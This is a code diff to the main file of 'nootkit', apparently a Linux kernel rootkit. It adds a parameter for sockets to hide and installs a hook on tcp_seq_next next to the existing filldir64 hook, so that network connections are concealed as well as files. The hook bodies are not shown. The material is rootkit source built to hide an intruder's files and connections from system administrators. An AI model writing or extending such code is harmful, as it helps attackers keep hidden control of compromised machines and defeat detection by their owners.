@@ -7,6 +7,7 @@
 #include "ksyms.h"
 #include "config.h"
 #include "hide/readdir.h"
+#include "hide/proc_net.h"
 
 static unsigned long kallsyms_lookup_name_addr;
 module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);
@@ -19,18 +20,33 @@ unsigned long hide_inodes[MAX_HIDE_ENTITIES];
 int hide_inodes_count;
 module_param_array(hide_inodes, ulong, &hide_inodes_count, 0);
 
+char *hide_sockets_strs[MAX_HIDE_ENTITIES];
+int hide_sockets_count;
+module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);
+
 int nootkit_init(void) {
     printk(KERN_INFO "Initializing nootkit!\n");
 
+    if (config_parse_globals()) {
+        printk(KERN_ERR "nootkit: Configuration parsing failed, aborting");
+        return 1;
+    }
+
+    if (!kallsyms_lookup_name_addr) {
+        printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting.");
+        return 2;
+    }
     resolve_ksyms((void *)kallsyms_lookup_name_addr);
 
     hide_hook_set_filldir64();
+    hide_hook_set_tcp_seq_next();
 
     return 0;
 }
 
 void nootkit_exit(void) {
     hide_hook_unset_filldir64();
+    hide_hook_unset_tcp_seq_next();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
